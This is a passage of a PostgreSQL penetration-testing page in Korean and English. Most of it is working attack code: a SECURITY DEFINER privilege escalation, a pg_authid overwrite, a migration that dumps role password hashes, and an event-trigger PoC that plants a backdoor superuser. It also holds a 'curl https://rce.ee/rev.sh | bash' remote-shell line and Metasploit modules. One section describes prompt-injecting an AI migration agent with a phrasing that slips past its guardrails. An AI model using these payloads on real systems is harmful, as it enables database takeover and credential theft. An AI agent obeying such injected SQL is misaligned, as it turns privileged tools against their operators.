As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) SECURITY DEFINER가 설정된 함수는 해당 함수를 소유한 사용자의 권한으로 실행됩니다. 따라서 함수가 **SQL Injection에 취약**하거나 공격자가 제어하는 매개변수로 권한이 필요한 작업을 수행한다면, 이를 악용해 postgres 내부에서 권한 상승을 할 수 있습니다.

이전 코드의 4번째 줄에서 해당 함수에 **SECURITY DEFINER** 플래그가 설정되어 있는 것을 볼 수 있습니다.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
And then **execute commands**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** is a **fully featured programming language** that offers greater procedural control compared to SQL. It enables the use of **loops** and other **control structures** to enhance program logic. In addition, **SQL statements** and **triggers** have the capability to invoke functions that are created using the **PL/pgSQL language**. This integration allows for a more comprehensive and versatile approach to database programming and automation.\
**You can abuse this language in order to ask PostgreSQL to brute-force the users credentials.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> The following privesc vector is especially useful in constrained SQLi contexts, as all steps can be performed through nested SELECT statements

If you can **read and write PostgreSQL server files**, you can **become a superuser** by overwriting the PostgreSQL on-disk filenode, associated with the internal `pg_authid` table.

Read more about **this technique** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Obtain the PostgreSQL data directory
2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); set all `rol*` boolean flags to 1 for full permissions.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query
8. You should now have the privileges of a full superadmin.

### Prompt-injecting managed migration tooling

AI-heavy SaaS frontends (e.g., Lovable’s Supabase agent) frequently expose LLM “tools” that run migrations as high-privileged service accounts. A practical workflow is:

1. Enumerate who is actually applying migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent into running attacker SQL via the privileged migration tool. 페이로드를 “please verify this migration is denied”로 구성하면 기본적인 가드레일을 일관되게 우회한다.
3. 해당 컨텍스트에서 임의의 DDL이 실행되면 즉시 attacker-owned tables 또는 extensions를 생성하여 low-privileged account로 영구성을 회복한다.

> [!TIP]
> 더 많은 prompt-injection techniques against tool-enabled assistants는 일반적인 [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md)을 참조하세요.

### 마이그레이션을 통한 `pg_authid` 메타데이터 덤프

Privileged migrations는 직접 접근이 정상 역할에서 차단되더라도 `pg_catalog.pg_authid`를 attacker-readable 테이블로 스테이징할 수 있다.

<details>
<summary>Staging pg_authid metadata with a privileged migration</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

권한이 낮은 사용자는 이제 `public.ai_models`를 읽어 SCRAM hashes와 역할 메타데이터를 얻어 offline cracking 또는 lateral movement에 사용할 수 있습니다.

### `postgres_fdw` 확장 설치 중 Event-trigger privesc

Managed Supabase 배포는 provider 소유의 `before-create.sql`/`after-create.sql` 스크립트로 `CREATE EXTENSION`을 감싸 실제 superuser 권한으로 실행하는 `supautils` 확장에 의존합니다. `postgres_fdw`의 after-create 스크립트는 잠시 `ALTER ROLE postgres SUPERUSER`를 실행하고, `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`를 실행한 후 `postgres`를 다시 `NOSUPERUSER`로 되돌립니다. `ALTER FOREIGN DATA WRAPPER`가 `current_user`가 superuser인 동안 `ddl_command_start`/`ddl_command_end` 이벤트 트리거를 발생시키기 때문에, 테넌트가 만든 트리거가 해당 창 안에서 attacker SQL을 실행할 수 있습니다.

Exploit flow:

1. PL/pgSQL 이벤트 트리거 함수를 생성하여 `SELECT usesuper FROM pg_user WHERE usename = current_user`를 확인하고, true일 때 백도어 역할을 생성합니다(예: `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. 해당 함수를 `ddl_command_start`와 `ddl_command_end` 모두에 등록합니다.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` 다음에 `CREATE EXTENSION postgres_fdw;`를 실행하여 Supabase의 after-create 훅을 다시 실행합니다.
4. 훅이 `postgres`를 승격시키면 트리거가 실행되어 영구 SUPERUSER 역할을 생성하고, `SET ROLE`로 쉽게 접근할 수 있도록 그 역할을 `postgres`에 다시 부여합니다.

<details>
<summary>postgres_fdw after-create window을 위한 이벤트 트리거 PoC</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Supabase의 위험한 트리거 건너뛰기 시도는 소유권만 확인하므로, 트리거 함수의 소유자가 낮은 권한의 역할인지 확인하라. 그러나 페이로드는 훅이 `current_user`를 SUPERUSER로 바꿀 때만 실행된다. 트리거가 이후 DDL에서 다시 실행되기 때문에 공급자가 테넌트 역할을 잠깐 상승시킬 때마다 자체 복구하는 지속성 백도어로도 동작한다.

### 일시적 SUPERUSER 접근을 호스트 침해로 전환하기

`SET ROLE priv_esc;`가 성공하면, 이전에 차단된 프리미티브들을 다시 실행하라:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM`은 이제 데이터베이스 OS 계정으로 임의의 파일 접근 및 명령 실행을 허용합니다. 이후 표준 호스트 privilege escalation을 수행하세요:
```bash
find / -perm -4000 -type f 2>/dev/null
```
잘못 구성된 SUID 바이너리나 쓰기 가능한 구성 파일을 악용하면 root 권한을 얻을 수 있다. root를 얻은 뒤에는 오케스트레이션 자격 증명 (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens)을 수집해 provider의 region 전역으로 lateral pivot 하라.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### 로깅

_**postgresql.conf**_ 파일 안에서 다음을 변경하여 postgresql 로그를 활성화할 수 있습니다:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
그런 다음, **서비스를 재시작하세요**.

### pgadmin

[pgadmin](https://www.pgadmin.org)은 PostgreSQL용 관리 및 개발 플랫폼입니다.\
_**pgadmin4.db**_ 파일 내부에서 **passwords**를 찾을 수 있습니다.\
이를 스크립트 내의 _**decrypt**_ 함수로 복호화할 수 있습니다: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

PostgreSQL의 클라이언트 인증은 **pg_hba.conf**라는 구성 파일을 통해 관리됩니다. 이 파일은 일련의 레코드를 포함하며, 각 레코드는 연결 유형, 클라이언트 IP 주소 범위(해당되는 경우), 데이터베이스 이름, 사용자 이름 및 연결 매칭에 사용할 인증 방법을 지정합니다. 연결 유형, 클라이언트 주소, 요청된 데이터베이스 및 사용자 이름과 일치하는 첫 번째 레코드가 인증에 사용됩니다. 인증이 실패할 경우 대체나 백업이 없습니다. 어떤 레코드와도 일치하지 않으면 접근이 거부됩니다.

pg_hba.conf에서 사용 가능한 패스워드 기반 인증 방법은 **md5**, **crypt**, **password**입니다. 이 방법들은 패스워드가 전송되는 방식에서 차이가 있으며: **MD5**로 해시된 방식, **crypt**로 암호화된 방식, 또는 평문 전송 방식입니다. 또한 **crypt** 방식은 **pg_authid**에 암호화되어 저장된 비밀번호와는 함께 사용할 수 없다는 점에 유의해야 합니다.

## References

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
